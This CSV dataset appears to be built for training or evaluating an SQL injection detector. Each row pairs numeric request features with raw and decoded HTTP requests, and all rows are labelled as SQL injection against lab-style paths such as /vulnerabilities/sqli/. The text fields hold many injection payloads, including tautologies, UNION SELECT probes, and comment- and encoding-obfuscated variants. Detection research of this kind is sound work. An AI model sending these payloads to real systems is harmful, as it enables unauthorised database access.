url_length,path_length,query_length,body_length,is_json_payload,json_depth,param_count_body,number_of_parameters,parameter_name_count,encoded_character_count,percent_encoded_count,single_quote_count,double_quote_count,semicolon_count,comma_count,parenthesis_count,dash_count,hash_count,asterisk_count,slash_count,equal_count,plus_count,whitespace_count,keyword_select,keyword_union,keyword_from,keyword_where,keyword_or,keyword_and,keyword_insert,keyword_update,keyword_delete,keyword_drop,keyword_alter,keyword_create,keyword_table,keyword_information_schema,keyword_sleep,keyword_benchmark,keyword_version,has_union_select,has_tautology,has_sql_comment,has_quote,has_subquery,has_information_schema,has_sleep,has_benchmark,has_if_function,has_case_when,has_exists,has_substring,has_ascii,has_length,has_database_function,has_version_function,has_system_variable,has_error_based_pattern,has_error_condition,nested_select_count,sql_function_count,comparison_count,logical_operator_count,method_get,method_post,status_code,is_error_response,response_size,response_time,ip_request_count,ip_unique_path_count,ip_unique_query_count,text,ip,timestamp,method,url,path,query,decoded_query,attack_type,label,label_source,request_hash
22,22,0,20,0,0,1,0,0,0,0,1,0,0,1,0,0,1,0,3,1,0,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,1,200,0,3111,0,13115,10,6928,"id=1' select 1,2 #",192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli/,/vulnerabilities/sqli/,,,sqli_case_var,1,existing_log_label,9adff983f66a61216e718f6ffcd49058
49,22,26,0,0,0,0,0,0,2,2,1,0,1,1,0,3,0,0,3,1,0,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,3698,0,13115,10,6928,"id=1' select 1,2 ;-- -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1'+select 1,2+%3B-- -",/vulnerabilities/sqli/,"id%3D1'+select 1,2+%3B-- -","id=1' select 1,2 ;-- -",sqli_case_var,1,existing_log_label,67242ca5e98a8a09af0de3d6202380d5
65,22,42,0,0,0,0,0,0,7,7,1,0,1,1,0,3,0,0,3,1,0,6,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,2144,1,13115,10,6928,"id=1' Union sELECT 1,2 ;-- -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27%20Union%20sELECT%201,2%20;--%20-",/vulnerabilities/sqli/,"id%3D1%27%20Union%20sELECT%201,2%20;--%20-","id=1' Union sELECT 1,2 ;-- -",sqli_case_var,1,existing_log_label,78d7ad2a27dda52502c743157d563192
10,10,0,53,0,0,1,0,0,0,0,1,0,0,0,0,3,0,8,9,2,0,2,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,0,1,200,0,2234,1,13115,10,6928,id=1'/**/or/**/1=1/**/--/**/-,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/login.php,/login.php,,,sqli_case_var,1,existing_log_label,1f70b74f0acad73b0bd6ab3f6bcddb36
57,22,34,0,0,0,0,0,0,7,7,1,0,0,1,0,0,0,0,3,1,3,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,3599,1,13115,10,6928,"id=1'+SeLeCt+1,2+%23",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2BSeLeCt%2B1%2C2%2B%2523,/vulnerabilities/sqli/,id%3D1%27%2BSeLeCt%2B1%2C2%2B%2523,"id=1'+SeLeCt+1,2+%23",sqli_case_var,1,existing_log_label,84288a78ea429288481d4e0376d4e8e0
67,22,43,0,0,0,0,1,2,10,10,1,0,0,0,0,0,0,6,9,2,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,2589,1,13115,10,6928,id=1'/**/aNd/**/1=1/**/,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1%27%2F%2A%2A/aNd%2F%2A%2A%2F1%3D1/*%2A/#,/vulnerabilities/sqli/,id=1%27%2F%2A%2A/aNd%2F%2A%2A%2F1%3D1/*%2A/,id=1'/**/aNd/**/1=1/**/,sqli_case_var,1,existing_log_label,b0856b8a52b002916d4d8ca3118e70e1
49,22,26,0,0,0,0,1,2,2,2,1,0,0,0,0,2,0,0,3,2,0,10,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,1631,0,13115,10,6928,id=1'   and   1=1   --,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1%27 ++and+++1%3D1+ +--,/vulnerabilities/sqli/,id=1%27 ++and+++1%3D1+ +--,id=1'   and   1=1   --,sqli_case_var,1,existing_log_label,15a3f13058690132042dc344f247dd62
76,22,53,0,0,0,0,0,0,10,10,1,0,0,1,0,3,0,8,11,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,4042,0,13115,10,6928,"id=1'/**/sELECT/**/1,2/**/--/**/-",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27/%2A*/sELECT%2F%2A*%2F1,2%2F**/--%2F%2A%2A/-",/vulnerabilities/sqli/,"id%3D1%27/%2A*/sELECT%2F%2A*%2F1,2%2F**/--%2F%2A%2A/-","id=1'/**/sELECT/**/1,2/**/--/**/-",sqli_case_var,1,existing_log_label,41f3bf08b39dfd5917d40c8ee6e980b5
89,22,66,0,0,0,0,2,8,10,10,0,0,0,0,0,0,0,0,3,2,6,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,0,1,0,200,0,3664,0,13115,10,6928,id=id%3D1%27++SeLeCt++1%2C2++%23&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2B%2BSeLeCt%2B%2B1%252C2%2B%2B%2523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2B%2BSeLeCt%2B%2B1%252C2%2B%2B%2523&Submit=Submit,id=id%3D1%27++SeLeCt++1%2C2++%23&Submit=Submit,sqli_case_var,1,existing_log_label,34e9d291be69ae2de9ffc721ee2da700
46,22,23,0,0,0,0,0,0,4,4,1,0,0,0,0,0,0,1,4,2,0,4,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,3596,0,13115,10,6928,id=1' Or 1=1 /*,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27+Or+1%3D1+%2F*,/vulnerabilities/sqli/,id%3D1%27+Or+1%3D1+%2F*,id=1' Or 1=1 /*,sqli_case_var,1,existing_log_label,e87f012ad28630fa4a750b7815f9e0fc
46,22,23,0,0,0,0,1,11,2,2,1,0,1,0,0,3,0,0,3,2,0,5,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,1286,1,13115,10,6928,id=1' AND 1=1 ;-- -,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1'+AND+1=1+%3B--+-,/vulnerabilities/sqli/,id%3D1'+AND+1=1+%3B--+-,id=1' AND 1=1 ;-- -,sqli_case_var,1,existing_log_label,374ad6e3ec11e56c453e851cc3815514
48,22,25,0,0,0,0,0,0,2,2,1,0,0,1,0,3,0,0,3,1,0,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,3116,0,13115,10,6928,"id=1' SeLeCt 1,2 -- -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27+SeLeCt+1,2+--+-",/vulnerabilities/sqli/,"id%3D1%27+SeLeCt+1,2+--+-","id=1' SeLeCt 1,2 -- -",sqli_case_var,1,existing_log_label,28c7d3adb4a9a55bbf9d2925be6e2a54
52,22,29,0,0,0,0,0,0,2,2,1,0,1,1,0,3,0,0,3,1,0,8,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,1983,0,13115,10,6928,"id=1'  SELECT 1,2  ;--  -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1'++SELECT 1,2+ %3B--++-",/vulnerabilities/sqli/,"id%3D1'++SELECT 1,2+ %3B--++-","id=1'  SELECT 1,2  ;--  -",sqli_case_var,1,existing_log_label,ac60d623511040694a8acdc8710ad00a
53,22,30,0,0,0,0,0,0,3,3,1,0,0,1,0,0,1,0,3,1,0,10,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,3790,0,13115,10,6928,"id=1'   SeLeCt   1,2   #",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27 ++SeLeCt+++1,2+++%23",/vulnerabilities/sqli/,"id%3D1%27 ++SeLeCt+++1,2+++%23","id=1'   SeLeCt   1,2   #",sqli_case_var,1,existing_log_label,ebea93f01cdc6befefa2082981b7cc03
50,22,27,0,0,0,0,0,0,1,1,1,0,0,1,0,0,0,1,4,1,0,5,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,2466,0,13115,10,6928,"id=1' Union Select 1,2 /*",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1'+Union+Select+1,2+/*",/vulnerabilities/sqli/,"id%3D1'+Union+Select+1,2+/*","id=1' Union Select 1,2 /*",sqli_case_var,1,existing_log_label,94871a2e11ae2b26c5e390bcd2fc7c50
47,22,24,0,0,0,0,1,2,5,5,1,0,0,0,0,0,1,0,3,2,0,4,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,1539,0,13115,10,6928,id=1' or 1=1 #,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1'%20or%201%3D1%20%23,/vulnerabilities/sqli/,id=1'%20or%201%3D1%20%23,id=1' or 1=1 #,sqli_case_var,1,existing_log_label,0403a0e62112558146adea9c8a581106
133,22,110,0,0,0,0,2,8,16,16,0,0,0,0,0,0,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,0,1,0,200,0,3660,0,13115,10,6928,id=id%3D1%27%2F%2A%2A%2Fselect%2F%2A%2A%2F1%2C2%2F%2A%2A%2F%2523&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%252F%252A%252A%252Fselect%252F%252A%252A%252F1%252C2%252F%252A%252A%252F%252523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%252F%252A%252A%252Fselect%252F%252A%252A%252F1%252C2%252F%252A%252A%252F%252523&Submit=Submit,id=id%3D1%27%2F%2A%2A%2Fselect%2F%2A%2A%2F1%2C2%2F%2A%2A%2F%2523&Submit=Submit,sqli_case_var,1,existing_log_label,2e29e4fb1ea0b5666360a68b8627da14
46,22,23,0,0,0,0,0,0,4,4,1,0,0,0,0,0,1,0,3,2,0,4,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,1000,0,13115,10,6928,id=1' AND 1=1 #,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27 AND 1%3D1 %23,/vulnerabilities/sqli/,id%3D1%27 AND 1%3D1 %23,id=1' AND 1=1 #,sqli_case_var,1,existing_log_label,40ae05db43101de1bf0fa24dfb73a550
47,22,23,0,0,0,0,1,2,0,0,1,0,0,0,0,0,0,6,9,2,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,3508,0,13115,10,6928,id=1'/**/aNd/**/1=1/**/,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1'/**/aNd/**/1=1/**/#,/vulnerabilities/sqli/,id=1'/**/aNd/**/1=1/**/,id=1'/**/aNd/**/1=1/**/,sqli_case_var,1,existing_log_label,b0856b8a52b002916d4d8ca3118e70e1
54,22,31,0,0,0,0,0,0,8,8,1,0,0,0,0,0,0,1,4,2,3,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,4216,0,13115,10,6928,id=1'+oR+1=1+/*,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2BoR%2B1%3D1%2B%2F%2A,/vulnerabilities/sqli/,id%3D1%27%2BoR%2B1%3D1%2B%2F%2A,id=1'+oR+1=1+/*,sqli_case_var,1,existing_log_label,d85950514ee39940f4a70f577a78f68f
99,22,76,0,0,0,0,2,8,8,8,0,0,0,0,0,3,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,0,1,0,200,0,2724,1,13115,10,6928,id=id%3D1%27%09unIOn%09select%091%2C2%09--%09-&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2509unIOn%2509select%25091%252C2%2509--%2509-&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2509unIOn%2509select%25091%252C2%2509--%2509-&Submit=Submit,id=id%3D1%27%09unIOn%09select%091%2C2%09--%09-&Submit=Submit,sqli_case_var,1,existing_log_label,ac32e99eb1b995c9dbaa9b27910627a5
105,22,82,0,0,0,0,2,8,13,13,0,0,0,0,0,0,0,0,3,2,8,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,0,1,0,200,0,2840,1,13115,10,6928,id=id%3D1%27++UNIoN++SELECT++1%2C2++%2F%2A&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2B%2BUNIoN%2B%2BSELECT%2B%2B1%252C2%2B%2B%252F%252A&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2B%2BUNIoN%2B%2BSELECT%2B%2B1%252C2%2B%2B%252F%252A&Submit=Submit,id=id%3D1%27++UNIoN++SELECT++1%2C2++%2F%2A&Submit=Submit,sqli_case_var,1,existing_log_label,a15f74d6c48cfdbcaa8619c64ed918f4
97,22,74,0,0,0,0,2,8,8,8,0,0,0,0,0,0,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,0,1,0,200,0,4397,1,13115,10,6928,id=id%3D1%27%2520SELECT%25201%2C2%2520%2F%2A&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%252520SELECT%2525201%252C2%252520%252F%252A&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%252520SELECT%2525201%252C2%252520%252F%252A&Submit=Submit,id=id%3D1%27%2520SELECT%25201%2C2%2520%2F%2A&Submit=Submit,sqli_case_var,1,existing_log_label,d78ffaa03681f4acb691724fc620b631
45,22,22,0,0,0,0,1,2,0,0,1,0,1,1,0,3,0,0,3,1,0,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,2475,0,13115,10,6928,"id=1' SeLeCt 1,2 ;-- -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1'+SeLeCt+1,2+;--+-",/vulnerabilities/sqli/,"id=1'+SeLeCt+1,2+;--+-","id=1' SeLeCt 1,2 ;-- -",sqli_case_var,1,existing_log_label,eaeabfe17b19f74bbb2455f7bc4e48ad
44,22,21,0,0,0,0,1,11,3,3,1,0,0,0,0,0,1,0,3,2,0,4,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,4316,0,13115,10,6928,id=1' aNd 1=1 #,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27+aNd+1=1+%23,/vulnerabilities/sqli/,id%3D1%27+aNd+1=1+%23,id=1' aNd 1=1 #,sqli_case_var,1,existing_log_label,a0ef492ab84ee1d2745c508460098fa4
44,22,21,0,0,0,0,0,0,3,3,1,0,0,0,0,0,1,0,3,2,0,4,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,3606,1,13115,10,6928,id=1' And 1=1 #,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1' And 1%3D1+%23,/vulnerabilities/sqli/,id%3D1' And 1%3D1+%23,id=1' And 1=1 #,sqli_case_var,1,existing_log_label,2fc977ecda16b9078ce9533ffb72077a
85,22,62,0,0,0,0,0,0,16,16,1,0,0,0,0,3,0,8,11,2,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,2518,0,13115,10,6928,id=1'/**/anD/**/1=1/**/--/**/-,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27/%2A%2A%2FanD%2F*%2A%2F1%3D1%2F%2A%2A%2F--%2F%2A*%2F-,/vulnerabilities/sqli/,id%3D1%27/%2A%2A%2FanD%2F*%2A%2F1%3D1%2F%2A%2A%2F--%2F%2A*%2F-,id=1'/**/anD/**/1=1/**/--/**/-,sqli_case_var,1,existing_log_label,17e1b5628a1d6a533ba071c0d38c366e
47,22,24,0,0,0,0,0,0,1,1,1,0,1,1,0,3,0,0,3,1,0,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,2490,1,13115,10,6928,"id=1' SELECT 1,2 ;-- -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1'+SELECT+1,2+;--+-",/vulnerabilities/sqli/,"id%3D1'+SELECT+1,2+;--+-","id=1' SELECT 1,2 ;-- -",sqli_case_var,1,existing_log_label,0bede76498a720646fd9c2bf16bc3c0e
77,22,54,0,0,0,0,2,8,7,7,0,0,0,0,0,0,0,0,3,2,3,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,633,1,13115,10,6928,id=id%3D1%27+aNd+1%3D1+%23&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2BaNd%2B1%253D1%2B%2523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2BaNd%2B1%253D1%2B%2523&Submit=Submit,id=id%3D1%27+aNd+1%3D1+%23&Submit=Submit,sqli_case_var,1,existing_log_label,6ab3967413dd50256d1e2a886148f54a
47,22,24,0,0,0,0,1,10,5,5,1,0,0,0,0,0,1,0,3,2,0,4,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,2350,1,13115,10,6928,id=1' oR 1=1 #,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1'%20oR%201=1%20%23,/vulnerabilities/sqli/,id%3D1'%20oR%201=1%20%23,id=1' oR 1=1 #,sqli_case_var,1,existing_log_label,f8658487becb20fdc6a6bc3358bdcece
43,22,20,0,0,0,0,0,0,2,2,1,0,0,0,0,2,0,0,3,2,0,4,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,1742,0,13115,10,6928,id=1' AND 1=1 --,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1'+AND 1%3D1+--,/vulnerabilities/sqli/,id%3D1'+AND 1%3D1+--,id=1' AND 1=1 --,sqli_case_var,1,existing_log_label,484cde1600c83e58bebb3b24703f80a0
54,22,31,0,0,0,0,0,0,3,3,1,0,1,1,0,3,0,0,3,1,0,8,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,4227,0,13115,10,6928,"id=1' SeLeCt  1,2  ;--  -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27 SeLeCt +1,2 +%3B--++-",/vulnerabilities/sqli/,"id%3D1%27 SeLeCt +1,2 +%3B--++-","id=1' SeLeCt  1,2  ;--  -",sqli_case_var,1,existing_log_label,e54bba82116bc0c2085af0edb03c4cd7
51,22,28,0,0,0,0,0,0,5,5,1,0,0,0,0,0,0,1,4,2,0,7,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,1851,0,13115,10,6928,id=1'  OR  1=1  /*,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27++OR++1%3D1++%2F%2A,/vulnerabilities/sqli/,id%3D1%27++OR++1%3D1++%2F%2A,id=1'  OR  1=1  /*,sqli_case_var,1,existing_log_label,b89253052c0eb8ffbeeee9758ce911b3
43,22,20,0,0,0,0,1,2,2,2,1,0,0,0,0,2,0,0,3,2,0,4,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,1537,0,13115,10,6928,id=1' AND 1=1 --,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1%27+AND+1%3D1+--,/vulnerabilities/sqli/,id=1%27+AND+1%3D1+--,id=1' AND 1=1 --,sqli_case_var,1,existing_log_label,484cde1600c83e58bebb3b24703f80a0
54,22,31,0,0,0,0,0,0,2,2,1,0,0,1,0,3,0,0,3,1,0,6,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,3616,0,13115,10,6928,"id=1' UnIoN sElEcT 1,2 -- -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27+UnIoN+sElEcT+1,2 --+-",/vulnerabilities/sqli/,"id%3D1%27+UnIoN+sElEcT+1,2 --+-","id=1' UnIoN sElEcT 1,2 -- -",sqli_case_var,1,existing_log_label,df757f43d9b19c140bae90d351635906
58,22,35,0,0,0,0,1,2,2,2,1,0,0,1,0,0,0,1,4,1,0,11,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,2919,0,13115,10,6928,"id=1'  UnIoN  sElEcT   1,2   /*",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1%27+ UnIoN+ sElEcT+++1,2+++%2F*",/vulnerabilities/sqli/,"id=1%27+ UnIoN+ sElEcT+++1,2+++%2F*","id=1'  UnIoN  sElEcT   1,2   /*",sqli_case_var,1,existing_log_label,91f53e5dad96862f05f36f22c5dc6a73
44,22,21,0,0,0,0,0,0,3,3,1,0,0,0,0,0,1,0,3,2,0,4,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,2335,1,13115,10,6928,id=1' aNd 1=1 #,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1'+aNd+1%3D1 %23,/vulnerabilities/sqli/,id%3D1'+aNd+1%3D1 %23,id=1' aNd 1=1 #,sqli_case_var,1,existing_log_label,a0ef492ab84ee1d2745c508460098fa4
151,22,128,0,0,0,0,2,8,20,20,0,0,0,0,0,3,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,972,1,13115,10,6928,id=id%3D1%27%2F%2A%2A%2FanD%2F%2A%2A%2F1%3D1%2F%2A%2A%2F%3B--%2F%2A%2A%2F-&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%252F%252A%252A%252FanD%252F%252A%252A%252F1%253D1%252F%252A%252A%252F%253B--%252F%252A%252A%252F-&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%252F%252A%252A%252FanD%252F%252A%252A%252F1%253D1%252F%252A%252A%252F%253B--%252F%252A%252A%252F-&Submit=Submit,id=id%3D1%27%2F%2A%2A%2FanD%2F%2A%2A%2F1%3D1%2F%2A%2A%2F%3B--%2F%2A%2A%2F-&Submit=Submit,sqli_case_var,1,existing_log_label,0d3550d5923efd025c6feda702f5b944
